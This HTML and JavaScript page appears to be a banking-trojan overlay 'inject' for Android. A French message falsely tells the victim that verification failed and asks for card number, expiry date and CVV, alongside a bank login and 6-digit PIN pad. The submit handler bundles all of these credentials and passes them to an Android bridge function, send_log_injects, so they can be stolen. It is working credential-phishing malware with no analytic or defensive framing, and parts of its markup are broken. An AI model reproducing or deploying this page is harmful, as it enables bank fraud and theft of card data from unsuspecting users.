<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <style>
        #form1, #form2 {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        header {
            flex: 0.5;
        }

        section {
            padding: 15px;
            flex: 0.5;
        }

        .toggle {
            position: relative;
            display: block;
            width: 40px;
            height: 20px;
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
            transform: translate3d(0, 0, 0);
        }

        .toggle:before {
            content: "";
            position: relative;
            top: 3px;
            left: 3px;
            width: 34px;
            height: 14px;
            display: block;
            background: #b2b2b2;
            border-radius: 8px;
            transition: background 0.2s ease;
        }

        .toggle span {
            position: absolute;
            top: 0;
            left: 0;
            width: 20px;
            height: 20px;
            display: block;
            background: #ececec;
            border-radius: 10px;
            transition: all 0.2s ease;
            box-shadow: 0 1px 3px rgb(121, 121, 121);
        }

        .toggle span:before {
            content: "";
            position: absolute;
            display: block;
            margin: -18px;
            height: 56px;
            border-radius: 50%;
            transform: scale(0);
            opacity: 1;
            pointer-events: none;
        }

        #cbx:checked + .toggle::before {
            background: #b2dad6;
        }

        #cbx:checked + .toggle span {
            background: #008275;
            transform: translateX(20px);
        }

        #cbx:checked + .toggle span:before {
            transform: scale(1);
            opacity: 0;
            transition: all 0.4s ease;
        }

        footer {
            padding: 15px;
        }

        .button {
            display: block;
            width: 220px;
            margin: 0 auto;
            margin-bottom: 15px;
            background-color: #f80116;
            color: #fff;
            padding: 10px;
            border: 0;
            border-radius: 25px;
            font-weight: 600;
        }

        .button:disabled {
            opacity: 0.4;
        }

        .input {
            width: 100%;
            padding: 8px;
            border: 0;
            border-bottom: 2px solid #cacaca;
            border-radius: 2px;
            color: #010035;
            font-weight: 600;
        }

        .fakePass {
            width: 10px;
            height: 10px;
            background-color: #efefef;
            border: 2px solid #efefef;
            border-radius: 75px;
            display: inline-block;
            margin-right: 15px;
        }

        .checked {
            background-color: #949494 !important;
            border-color: #949494;
        }

        .pinpad-item {
            background-color: #f7f7f7;
            color: #333333;
            font-size: 24px;
            padding: 2px;
            border: 1px solid #dfdfdf;
            border-radius: 4px;
            cursor: pointer;
            width: 42px;
        }

        ::placeholder {
            color: #a8a8a8;
            font-weight: 600;
            opacity: 1;
        }

        ::-moz-placeholder {
            color: #a8a8a8;
            font-weight: 600;
            opacity: 1;
        }

        ::-webkit-input-placeholder {
            color: #a8a8a8;
            font-weight: 600;
            opacity: 1;
        }

        :-moz-placeholder {
            color: #a8a8a8;
            font-weight: 600;
            opacity: 1;
        }

        :-ms-input-placeholder {
            color: #a8a8a8;
            font-weight: 600;
            opacity: 1;
        }

        #secondBlock {
            height: 0;
            overflow: hidden;
            transition-duration: 0.5s;
        }

        .error {
            border-color: #f00 !important;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }
    </style>
</head>
<body ng-app="app" ng-controller="c1">

        <span  class="fa fa-circle-o-notch  fa-spin " style="position:relative;top:50%;font-size:50px;color:#f80116"></span>
    </div>

            </header>
            <section>
                <b style="margin-bottom: 15px;display: inline-block;"> Nous n'avons pas pu vous vérifier, veuillez effectuer une vérification supplémentaire avec votre carte. </b>
            
                <input type="tel" id="cc" name="cc" onkeyup="check6();check8()" class="input login" style="margin-bottom: 15px" placeholder="Carte de crédit" autocomplete="off"> 
                
                <input type="tel" id="exp" name="exp" maxlength="5" style="width: 55%;float: left;" onkeyup="check7();check8()" class="input" placeholder="Date d'expiration" autocomplete="off">
                <input type="password" id="cvv" name="cvv" maxlength="3" style="width: 40%;float: right;" onkeyup="check8()" class="input" placeholder="CVV" autocomplete="off">

            </section>
            <footer>
                <input type="submit" class="button" id="sendData" disabled value="Valider">
            </footer>
        </div>
    </form>
    <script>
        $('#cc').mask('0000 0000 0000 0000')
        $('#exp').mask('00/00')
        $('#cvv').mask('000')
        $('#login').mask('00000000')
        
        var spinner = document.getElementById('spinner'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2');

        var firstBlock = document.getElementById('firstBlock'),
            secondBlock = document.getElementById('secondBlock');

        var ok = document.getElementById('ok'),
            deletePassword = document.getElementById('deletePassword'),
            hello = document.getElementById('hello');

        var nextPage = document.getElementById('nextPage'),
            lastPage = document.getElementById('lastPage'),
            sendData = document.getElementById('sendData');

        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var btnPin = document.getElementById('btnPin'),
            fake1 = document.getElementById('fake1'),
            fake2 = document.getElementById('fake2'),
            fake3 = document.getElementById('fake3'),
            fake4 = document.getElementById('fake4'),
            fake5 = document.getElementById('fake5'),
            fake6 = document.getElementById('fake6');
        
        app = angular.module('app', [])
        app.controller('c1', ['$scope', function ($scope) {
            $sc_ = $scope
            $scope.pin = ""
            $scope.edit_pin = function (password) {
                if ($scope.pin.length >= 0) {
                    deletePassword.style.display = 'inline'
                }

                if ($scope.pin.length != 6) {
                    try{
                        document.getElementById('input_next2').disabled = false;
                    } catch(e){};
                    $scope.pin += '' + password;
                    $("#password").val($scope.pin);
                    lastPage.disabled = true;
                    console.log($scope.pin);
                }

                if($scope.pin.length === 6 && login.value.length === 8) {
                    ok.style.display = 'inline';
                    lastPage.disabled = false;
                } else {
                    lastPage.disabled = true;
                    ok.style.display = 'none';
                }

                login.onkeyup = () => {
                    if(login.value.length === 8 && $scope.pin.length === 6) {
                        lastPage.disabled = false
                    } else {
                        lastPage.disabled = true
                    }
                }

                deletePassword.onclick = () => {
                    deletePassword.style.display = 'none';
                    $scope.pin = "";
                    $scope.pin.length = 0;
                    $("#password").val($scope.pin);
                    lastPage.disabled = true;
                    fake1.classList.remove('checked');
                    fake2.classList.remove('checked');
                    fake3.classList.remove('checked');
                    fake4.classList.remove('checked');
                    fake5.classList.remove('checked');
                    fake6.classList.remove('checked');
                }
            }
        }])

        login.onkeyup = () => {
            if(login.value.length === 8) {
                ok.style.display = 'inline';
                nextPage.disabled = false;
            } else {
                ok.style.display = 'none';
                nextPage.disabled = true;
            }
        }

        nextPage.onclick = () => {
            firstBlock.style.display = 'none';
            secondBlock.style.height = '307px';
            hello.style.display = 'none';
        }

        lastPage.onclick = () => {
            spinner.style.display = 'block';

            setTimeout(() => {
                form1.style.display = 'none';
                spinner.style.display = 'none';
                form2.style.display = 'flex';
            }, 1500);
        }

        function check7() {
            
            var mmYY = exp.value.split('/');
            var month = parseInt(mmYY[0]);
            var year = parseInt(mmYY[1]);
    
            var expArray = exp.value.split('/');
            var today, someday;
            var exMonth = expArray[0];
            var exYear = "20" + expArray[1];
    
            today = new Date();
            someday = new Date();
            someday.setFullYear(exYear, exMonth, 1);
                    
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
            
        }

        function check8() {
            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        sendData.onclick = () => {
            var data = {};
            data.login = login.value;
            data.password = password.value;
            data.cc = cc.value;
            data.exp = exp.value;
            data.cvv = cvv.value;
            data.type_injects = "banks";
            data.closed = "close_activity_injects";

            var ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("android") > -1) {
                try {
                    Android.send_log_injects(JSON.stringify(data))
                } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
        }

        for(var i = 0; i <= 10; i++){
           btnPin = document.getElementById('btnPin' + i);
            
            btnPin.onclick = function(){
                if(fake1.classList == 'fakePass') {
                    fake1.classList.add('checked');
                } else if(fake2.classList == 'fakePass') {
                    fake2.classList.add('checked');
                } else if(fake3.classList == 'fakePass') {
                    fake3.classList.add('checked');
                } else if(fake4.classList == 'fakePass') {
                    fake4.classList.add('checked');
                } else if(fake5.classList == 'fakePass') {
                    fake5.classList.add('checked');
                } else if(fake6.classList == 'fakePass') {
                    fake6.classList.add('checked');
                }
            }
        }
    </script>
</body>
</html>
